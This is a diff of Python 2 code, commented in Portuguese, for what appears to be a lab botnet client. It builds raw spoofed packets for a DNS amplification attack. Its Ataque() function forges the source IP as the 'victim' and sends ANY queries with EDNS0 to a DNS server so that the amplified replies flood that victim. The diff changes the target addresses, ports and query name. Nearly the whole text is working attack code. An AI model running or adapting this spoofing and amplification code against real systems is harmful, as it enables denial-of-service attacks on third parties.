@@ -10,7 +10,12 @@ serverName = '192.168.0.102'
 serverPort = 12000
 clientSocket = socket(AF_INET, SOCK_DGRAM)
 
-clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
+try:
+    clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
+except error, e:
+    if e[0] == 101:
+        print 'Rede inacessivel'
+
 server = ('', 0)
 ATACANDO = False
 event = threading.Event()
@@ -30,7 +35,7 @@ def Ataque():
     packet = '';
 
     source_ip = '192.168.0.102' # vitima do ataque
-    dest_ip = '192.168.0.106'  # servidor DNS
+    dest_ip = '192.168.0.108'  # servidor DNS
 
     # ip header fields
     ihl = 5
@@ -50,21 +55,22 @@ def Ataque():
     ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 
     data = ''
-    sport = 9000    # arbitrary source port
+    sport = 50000    # arbitrary source port
     dport = 53   # arbitrary destination port
-    length = 51
+    length = 48
     checksum = 0
     udp_header = pack('!HHHH', sport, dport, length, checksum)
 
 
-    trans_ID = 0x6f25
+    trans_ID = 0xdcc6#6f25
     flags_dns = 0x0120
     questions = 0x0001
     answer = 0
     authority = 0
     additionalRR = 0x0001
-    querry_name1 = 0x0a72656e6e657465
-    querry_name2 = 0x73746503636f6d00 #renneteste.com
+    querry_name1 = 0x036e733103747232#0a72656e6e657465
+    querry_name2 = 0x03636f6d#73746503636f6d00 #renneteste.com
+    querry_name3 = 0
     type_dns = 0x00ff
     class_dns = 0x0001
     additional_name = 0
@@ -75,7 +81,7 @@ def Ataque():
     z = 0
     datal = 0
 
-    dns_header = pack('!HHHHHHQQHHBHHBBHH', trans_ID,flags_dns,questions,answer,authority,additionalRR, querry_name1,querry_name2, type_dns,class_dns,additional_name,additional_type,udp_payloadsize,higher,edns0v,z,datal)
+    dns_header = pack('!HHHHHHQLBHHBHHBBHH', trans_ID,flags_dns,questions,answer,authority,additionalRR, querry_name1,querry_name2, querry_name3, type_dns,class_dns,additional_name,additional_type,udp_payloadsize,higher,edns0v,z,datal)
 
     # final full packet - syn packets dont have any data
     packet = ip_header + udp_header + dns_header
